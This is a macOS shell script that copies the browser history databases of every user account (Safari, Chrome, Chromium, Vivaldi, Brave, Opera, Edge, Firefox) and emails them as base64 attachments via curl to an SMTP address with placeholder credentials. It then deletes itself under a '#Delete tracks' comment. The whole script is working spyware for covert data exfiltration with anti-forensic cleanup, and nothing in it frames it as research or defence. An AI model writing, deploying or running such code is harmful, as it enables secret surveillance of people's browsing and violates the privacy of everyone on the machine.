#Get host name
HOSTNAME=$(hostname)
#Set email from
EMAIL_FROM='test@test.com'
EMAIL_FROM_PASS='test'
#Set email to
EMAIL_TO='test.test@test.com'
SMTP_URL='smtp://smtp.test.com:587'

#Send Safari history
for user_home in /Users/*; do
  S_HISTORY_FILE="$user_home/Library/Safari/History.db"
  #Check if the file exists and is not empty
  if [ -f "$S_HISTORY_FILE" ] && [ -s "$S_HISTORY_FILE" ]; then
    sudo cp "$S_HISTORY_FILE" /tmp/safari_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Safari browser history
Content-Type: application/octet-stream; name="safari_history_$(basename $user_home)"
Content-Disposition: attachment; filename="safari_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(sudo base64 -i /tmp/safari_history_$(basename $user_home))
EOF
  fi
done

#Send Chromium history
for user_home in /Users/*; do
  CH_HISTORY_FILE="$user_home/Library/Application Support/Chromium/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$CH_HISTORY_FILE" ] && [ -s "$CH_HISTORY_FILE" ]; then
    cp "$CH_HISTORY_FILE" /tmp/chromium_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Chromium browser history
Content-Type: application/octet-stream; name="chromium_history_$(basename $user_home)"
Content-Disposition: attachment; filename="chromium_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/chromium_history_$(basename $user_home))
EOF
  fi
done

#Send Chrome history
for user_home in /Users/*; do
  C_HISTORY_FILE="$user_home/Library/Application Support/Google/Chrome/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$C_HISTORY_FILE" ] && [ -s "$C_HISTORY_FILE" ]; then
    cp "$C_HISTORY_FILE" /tmp/chrome_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Chrome browser history
Content-Type: application/octet-stream; name="chrome_history_$(basename $user_home)"
Content-Disposition: attachment; filename="chrome_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/chrome_history_$(basename $user_home))
EOF
  fi
done

#Send Vivaldi history
for user_home in /Users/*; do
  V_HISTORY_FILE="$user_home/Library/Application Support/Vivaldi/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$V_HISTORY_FILE" ] && [ -s "$V_HISTORY_FILE" ]; then
    cp "$V_HISTORY_FILE" /tmp/vivaldi_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Vivaldi browser history
Content-Type: application/octet-stream; name="vivaldi_history_$(basename $user_home)"
Content-Disposition: attachment; filename="vivaldi_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/vivaldi_history_$(basename $user_home))
EOF
  fi
done

#Send Brave history
for user_home in /Users/*; do
  B_HISTORY_FILE="$user_home/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$B_HISTORY_FILE" ] && [ -s "$B_HISTORY_FILE" ]; then
    cp "$B_HISTORY_FILE" /tmp/brave_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Brave browser history
Content-Type: application/octet-stream; name="brave_history_$(basename $user_home)"
Content-Disposition: attachment; filename="brave_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/brave_history_$(basename $user_home))
EOF
  fi
done

#Send Opera history
for user_home in /Users/*; do
  O_HISTORY_FILE="$user_home/Library/Application Support/com.operasoftware.Opera/History"
  #Check if the file exists and is not empty
  if [ -f "$O_HISTORY_FILE" ] && [ -s "$O_HISTORY_FILE" ]; then
    cp "$O_HISTORY_FILE" /tmp/opera_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Opera browser history
Content-Type: application/octet-stream; name="opera_history_$(basename $user_home)"
Content-Disposition: attachment; filename="opera_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/opera_history_$(basename $user_home))
EOF
  fi
done

#Send Edge history
for user_home in /Users/*; do
  E_HISTORY_FILE="$user_home/Application Support/Microsoft Edge/Default/History"
  #Check if the file exists and is not empty
  if [ -f "$E_HISTORY_FILE" ] && [ -s "$E_HISTORY_FILE" ]; then
    cp "$E_HISTORY_FILE" /tmp/edge_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Edge browser history
Content-Type: application/octet-stream; name="edge_history_$(basename $user_home)"
Content-Disposition: attachment; filename="edge_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/edge_history_$(basename $user_home))
EOF
  fi
done

#Send Firefox history
for user_home in /Users/*; do
  F_HISTORY_FILE=$(find "$user_home/Library/Application Support/Firefox" -type f -name "places.sqlite")
  #Check if the file exists and is not empty
  if [ -f "$F_HISTORY_FILE" ] && [ -s "$F_HISTORY_FILE" ]; then
    cp "$F_HISTORY_FILE" /tmp/firefox_history_$(basename $user_home)
    curl --ssl-reqd --url "$SMTP_URL" --user "$EMAIL_FROM:$EMAIL_FROM_PASS" --mail-from $EMAIL_FROM --mail-rcpt $EMAIL_TO --upload-file - <<EOF
From: Browsing history <$EMAIL_FROM>
To: John Doe <$EMAIL_TO>
Subject: $HOSTNAME $(basename $user_home) Firefox browser history
Content-Type: application/octet-stream; name="firefox_history_$(basename $user_home)"
Content-Disposition: attachment; filename="firefox_history_$(basename $user_home)"
Content-Transfer-Encoding: base64
$(base64 -i /tmp/firefox_history_$(basename $user_home))
EOF
  fi
done

#Delete tracks
rm -f gbhm.sh
rm -f /tmp/*_history
